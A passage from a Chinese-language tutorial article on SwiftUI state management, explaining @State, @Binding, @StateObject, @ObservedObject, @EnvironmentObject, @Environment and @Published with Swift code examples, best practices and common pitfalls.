                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">SwiftUI 状态管理详解</h2>
<p>SwiftUI 的状态管理系统是其核心特性，理解它是构建复杂应用的基础。以下是 SwiftUI 状态管理的全面详解：</p>
<h3 data-id="heading-1">1. <strong>状态管理的基本概念</strong></h3>
<h4 data-id="heading-2">什么是状态？</h4>
<p>状态是随时间变化的数据，这些变化会触发视图的更新。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 基本状态声明</span>
<span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>  <span class="hljs-comment">// 简单值</span>
<span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> user <span class="hljs-operator">=</span> <span class="hljs-type">User</span>()  <span class="hljs-comment">// 引用类型（不推荐）</span>
<span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []  <span class="hljs-comment">// 集合</span>
</code></pre>
<h3 data-id="heading-3">2. <strong>@State</strong></h3>
<h4 data-id="heading-4">特性</h4>
<ul>
<li><strong>私有状态</strong>：只能在当前视图内部访问</li>
<li><strong>值类型专用</strong>：最适合简单值类型（Int、String、Bool等）</li>
<li><strong>视图拥有</strong>：当视图被销毁时，状态也被销毁</li>
<li><strong>自动更新</strong>：状态改变时，视图自动重新计算</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">CounterView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Count: <span class="hljs-subst">\(count)</span>"</span>)
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Increment"</span>) {
                count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-5">底层原理</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// @State 的简化实现概念</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">State</span>&lt;<span class="hljs-title class_">Value</span>&gt; {
    <span class="hljs-keyword">var</span> wrappedValue: <span class="hljs-type">Value</span>
    <span class="hljs-keyword">var</span> projectedValue: <span class="hljs-type">Binding</span>&lt;<span class="hljs-type">Value</span>&gt;
    
    <span class="hljs-comment">// SwiftUI 内部管理：</span>
    <span class="hljs-comment">// 1. 在视图之外存储实际值</span>
    <span class="hljs-comment">// 2. 监听变化</span>
    <span class="hljs-comment">// 3. 触发视图更新</span>
}
</code></pre>
<h3 data-id="heading-6">3. <strong>@Binding</strong></h3>
<h4 data-id="heading-7">特性</h4>
<ul>
<li><strong>双向连接</strong>：在视图之间创建双向数据流</li>
<li><strong>不拥有数据</strong>：只是对现有状态的引用</li>
<li><strong>使用 $ 前缀</strong>：获取绑定</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 父视图</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ParentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isOn <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">ChildView</span>(isOn: <span class="hljs-variable">$isOn</span>)  <span class="hljs-comment">// 传递绑定</span>
    }
}

<span class="hljs-comment">// 子视图</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> isOn: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Toggle</span>(<span class="hljs-string">"Switch"</span>, isOn: <span class="hljs-variable">$isOn</span>)
    }
}
</code></pre>
<h3 data-id="heading-8">4. <strong>@StateObject vs @ObservedObject</strong></h3>
<h4 data-id="heading-9">对比</h4>






























<table><thead><tr><th>特性</th><th>@StateObject</th><th>@ObservedObject</th></tr></thead><tbody><tr><td><strong>生命周期</strong></td><td>视图拥有并管理</td><td>外部管理，视图只观察</td></tr><tr><td><strong>创建时机</strong></td><td>视图初始化时创建</td><td>外部传入</td></tr><tr><td><strong>数据丢失</strong></td><td>视图更新时保留</td><td>视图更新时可能丢失</td></tr><tr><td><strong>使用场景</strong></td><td>创建并拥有 ViewModel</td><td>接收父视图传递的 ViewModel</td></tr></tbody></table>
<h4 data-id="heading-10">@StateObject 示例</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"John"</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> age <span class="hljs-operator">=</span> <span class="hljs-number">30</span>
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">UserViewModel</span>()  <span class="hljs-comment">// 视图创建并拥有</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Name: <span class="hljs-subst">\(viewModel.name)</span>"</span>)
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Age: <span class="hljs-subst">\(viewModel.age)</span>"</span>)
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Increase Age"</span>) {
                viewModel.age <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-11">@ObservedObject 示例</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ParentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> sharedViewModel <span class="hljs-operator">=</span> <span class="hljs-type">SharedViewModel</span>()
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">ChildView</span>(viewModel: sharedViewModel)  <span class="hljs-comment">// 传递引用</span>
        }
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@ObservedObject</span> <span class="hljs-keyword">var</span> viewModel: <span class="hljs-type">SharedViewModel</span>  <span class="hljs-comment">// 观察外部对象</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(<span class="hljs-string">"Data: <span class="hljs-subst">\(viewModel.data)</span>"</span>)
    }
}
</code></pre>
<h3 data-id="heading-12">5. <strong>@EnvironmentObject</strong></h3>
<h4 data-id="heading-13">特性</h4>
<ul>
<li><strong>全局共享</strong>：在视图层次中隐式共享</li>
<li><strong>避免传递链</strong>：不需要逐层传递</li>
<li><strong>必须提供</strong>：使用前必须通过 <code>.environmentObject()</code> 提供</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 1. 创建 ObservableObject</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AppSettings</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> theme <span class="hljs-operator">=</span> <span class="hljs-string">"Light"</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> fontSize <span class="hljs-operator">=</span> <span class="hljs-number">16.0</span>
}

<span class="hljs-comment">// 2. 在根视图提供</span>
<span class="hljs-keyword">@main</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyApp</span>: <span class="hljs-title class_">App</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> settings <span class="hljs-operator">=</span> <span class="hljs-type">AppSettings</span>()
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">Scene</span> {
        <span class="hljs-type">WindowGroup</span> {
            <span class="hljs-type">ContentView</span>()
                .environmentObject(settings)  <span class="hljs-comment">// 注入环境</span>
        }
    }
}

<span class="hljs-comment">// 3. 在任何子视图中访问</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@EnvironmentObject</span> <span class="hljs-keyword">var</span> settings: <span class="hljs-type">AppSettings</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Theme: <span class="hljs-subst">\(settings.theme)</span>"</span>)
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Toggle Theme"</span>) {
                settings.theme <span class="hljs-operator">=</span> settings.theme <span class="hljs-operator">==</span> <span class="hljs-string">"Light"</span> <span class="hljs-operator">?</span> <span class="hljs-string">"Dark"</span> : <span class="hljs-string">"Light"</span>
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-14">6. <strong>@Environment</strong></h3>
<h4 data-id="heading-15">特性</h4>
<ul>
<li><strong>系统值</strong>：访问系统提供的环境值</li>
<li><strong>自定义环境</strong>：也可以定义自己的环境值</li>
<li><strong>只读</strong>：通常是只读的（除非使用 Binding）</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 使用系统环境值</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">SystemInfoView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Environment</span>(\.colorScheme) <span class="hljs-keyword">var</span> colorScheme
    <span class="hljs-meta">@Environment</span>(\.sizeCategory) <span class="hljs-keyword">var</span> sizeCategory
    <span class="hljs-meta">@Environment</span>(\.locale) <span class="hljs-keyword">var</span> locale
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Color Scheme: <span class="hljs-subst">\(colorScheme <span class="hljs-operator">==</span> .dark <span class="hljs-operator">?</span> <span class="hljs-string">"Dark"</span> : <span class="hljs-string">"Light"</span>)</span>"</span>)
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Locale: <span class="hljs-subst">\(locale.identifier)</span>"</span>)
        }
    }
}

<span class="hljs-comment">// 自定义环境值</span>
<span class="hljs-comment">// 1. 定义环境键</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserThemeKey</span>: <span class="hljs-title class_">EnvironmentKey</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> defaultValue <span class="hljs-operator">=</span> <span class="hljs-string">"Light"</span>
}

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">EnvironmentValues</span> {
    <span class="hljs-keyword">var</span> userTheme: <span class="hljs-type">String</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">self</span>[<span class="hljs-type">UserThemeKey</span>.<span class="hljs-keyword">self</span>] }
        <span class="hljs-keyword">set</span> { <span class="hljs-keyword">self</span>[<span class="hljs-type">UserThemeKey</span>.<span class="hljs-keyword">self</span>] <span class="hljs-operator">=</span> newValue }
    }
}

<span class="hljs-comment">// 2. 使用自定义环境</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ThemedView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Environment</span>(\.userTheme) <span class="hljs-keyword">var</span> theme
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(<span class="hljs-string">"Current theme: <span class="hljs-subst">\(theme)</span>"</span>)
    }
}

<span class="hljs-comment">// 3. 设置自定义环境</span>
<span class="hljs-type">ParentView</span>()
    .environment(\.userTheme, <span class="hljs-string">"Dark"</span>)
</code></pre>
<h3 data-id="heading-16">7. <strong>@Published 与 ObservableObject</strong></h3>
<h4 data-id="heading-17">工作机制</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-comment">// 自动发布变化</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"Alice"</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> score <span class="hljs-operator">=</span> <span class="hljs-number">100</span>
    
    <span class="hljs-comment">// 手动控制发布</span>
    <span class="hljs-keyword">var</span> manualProperty <span class="hljs-operator">=</span> <span class="hljs-string">"Test"</span> {
        <span class="hljs-keyword">willSet</span> {
            objectWillChange.send()  <span class="hljs-comment">// 手动触发更新</span>
        }
    }
    
    <span class="hljs-comment">// 计算属性需要手动触发</span>
    <span class="hljs-keyword">var</span> displayName: <span class="hljs-type">String</span> {
        <span class="hljs-string">"User: <span class="hljs-subst">\(name)</span>"</span>
        <span class="hljs-comment">// 注意：计算属性变化不会自动触发，除非依赖的 @Published 属性变化</span>
    }
}
</code></pre>
<h3 data-id="heading-18">8. <strong>状态管理的最佳实践</strong></h3>
<h4 data-id="heading-19">1. <strong>选择合适的工具</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 决策树：</span>
<span class="hljs-comment">// 1. 是否只在当前视图使用？ → @State</span>
<span class="hljs-comment">// 2. 是否需要在子视图中修改？ → @Binding</span>
<span class="hljs-comment">// 3. 是否在多个视图共享？ → ObservableObject</span>
<span class="hljs-comment">// 4. 是否全局共享？ → @EnvironmentObject</span>
<span class="hljs-comment">// 5. 是否访问系统设置？ → @Environment</span>
</code></pre>
<h4 data-id="heading-20">2. <strong>避免在 body 中创建状态</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ❌ 错误：每次都会创建新实例</span>
<span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
    <span class="hljs-keyword">let</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">ViewModel</span>()  <span class="hljs-comment">// 错误！</span>
    <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// ✅ 正确：使用 @StateObject</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">ViewModel</span>()  <span class="hljs-comment">// 只创建一次</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<h4 data-id="heading-21">3. <strong>状态提升（State Hoisting）</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 将状态提升到最近的共同祖先</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ParentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> text <span class="hljs-operator">=</span> <span class="hljs-string">""</span>  <span class="hljs-comment">// 状态提升</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">ChildAView</span>(text: <span class="hljs-variable">$text</span>)
            <span class="hljs-type">ChildBView</span>(text: <span class="hljs-variable">$text</span>)
        }
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildAView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> text: <span class="hljs-type">String</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">TextField</span>(<span class="hljs-string">"Enter text"</span>, text: <span class="hljs-variable">$text</span>)
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildBView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> text: <span class="hljs-type">String</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(<span class="hljs-string">"You typed: <span class="hljs-subst">\(text)</span>"</span>)
    }
}
</code></pre>
<h4 data-id="heading-22">4. <strong>使用 ViewModel 管理复杂状态</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> username <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> password <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> errorMessage: <span class="hljs-type">String</span>?
    
    <span class="hljs-keyword">var</span> isFormValid: <span class="hljs-type">Bool</span> {
        <span class="hljs-operator">!</span>username.isEmpty <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">!</span>password.isEmpty
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">login</span>() <span class="hljs-keyword">async</span> {
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
        errorMessage <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>
        
        <span class="hljs-comment">// 模拟网络请求</span>
        <span class="hljs-keyword">do</span> {
            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
            <span class="hljs-comment">// 处理登录逻辑</span>
        } <span class="hljs-keyword">catch</span> {
            errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"Login failed"</span>
        }
        
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">LoginView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">LoginViewModel</span>()
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Form</span> {
            <span class="hljs-type">TextField</span>(<span class="hljs-string">"Username"</span>, text: <span class="hljs-variable">$viewModel</span>.username)
            <span class="hljs-type">SecureField</span>(<span class="hljs-string">"Password"</span>, text: <span class="hljs-variable">$viewModel</span>.password)
            
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> viewModel.errorMessage {
                <span class="hljs-type">Text</span>(error).foregroundColor(.red)
            }
            
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Login"</span>) {
                <span class="hljs-type">Task</span> {
                    <span class="hljs-keyword">await</span> viewModel.login()
                }
            }
            .disabled(<span class="hljs-operator">!</span>viewModel.isFormValid <span class="hljs-operator">||</span> viewModel.isLoading)
        }
    }
}
</code></pre>
<h3 data-id="heading-23">9. <strong>状态管理的性能优化</strong></h3>
<h4 data-id="heading-24">1. <strong>使用 Equatable 避免不必要的更新</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span>, <span class="hljs-title class_">Equatable</span> {
    <span class="hljs-keyword">let</span> user: <span class="hljs-type">User</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(user.name)
            .background(<span class="hljs-type">Color</span>.random())
    }
    
    <span class="hljs-comment">// 实现 Equatable，只有 user.id 变化时才更新</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">==</span> (<span class="hljs-params">lhs</span>: <span class="hljs-type">UserView</span>, <span class="hljs-params">rhs</span>: <span class="hljs-type">UserView</span>) -&gt; <span class="hljs-type">Bool</span> {
        lhs.user.id <span class="hljs-operator">==</span> rhs.user.id
    }
}

<span class="hljs-comment">// 在父视图中使用</span>
<span class="hljs-type">List</span>(users) { user <span class="hljs-keyword">in</span>
    <span class="hljs-type">UserView</span>(user: user)
        .equatable()  <span class="hljs-comment">// 启用自定义相等性检查</span>
}
</code></pre>
<h4 data-id="heading-25">2. <strong>使用 .id() 修饰符强制更新</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DynamicView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> version <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-comment">// 当 version 变化时，整个视图会重新创建</span>
            <span class="hljs-type">ComplexView</span>()
                .id(version)
            
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Refresh"</span>) {
                version <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>  <span class="hljs-comment">// 强制重新创建</span>
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-26">3. <strong>避免在 body 中创建闭包</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ❌ 错误：每次都会创建新闭包</span>
<span class="hljs-type">Button</span>(action: {
    <span class="hljs-keyword">self</span>.doSomething()  <span class="hljs-comment">// 每次 body 计算都创建新闭包</span>
}) {
    <span class="hljs-type">Text</span>(<span class="hljs-string">"Click me"</span>)
}

<span class="hljs-comment">// ✅ 正确：使用私有方法</span>
<span class="hljs-type">Button</span>(action: doSomething) {
    <span class="hljs-type">Text</span>(<span class="hljs-string">"Click me"</span>)
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">doSomething</span>() {
    <span class="hljs-comment">// 处理逻辑</span>
}
</code></pre>
<h3 data-id="heading-27">10. <strong>状态管理的常见陷阱</strong></h3>
<h4 data-id="heading-28">陷阱1：在子视图中修改 @State</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ❌ 错误：不能直接在子视图中修改父视图的 @State</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-keyword">var</span> count: <span class="hljs-type">Int</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Increment"</span>) {
            <span class="hljs-comment">// 错误！不能修改</span>
        }
    }
}

<span class="hljs-comment">// ✅ 正确：使用 @Binding</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> count: <span class="hljs-type">Int</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Increment"</span>) {
            count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>  <span class="hljs-comment">// 正确！</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-29">陷阱2：@State 与引用类型</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"John"</span>
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> user <span class="hljs-operator">=</span> <span class="hljs-type">User</span>()  <span class="hljs-comment">// 不推荐！</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Change Name"</span>) {
            user.name <span class="hljs-operator">=</span> <span class="hljs-string">"Alice"</span>  <span class="hljs-comment">// ❌ 不会触发视图更新！</span>
        }
    }
}

<span class="hljs-comment">// ✅ 正确：使用 @StateObject 或 @ObservedObject</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"John"</span>
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">UserViewModel</span>()
    
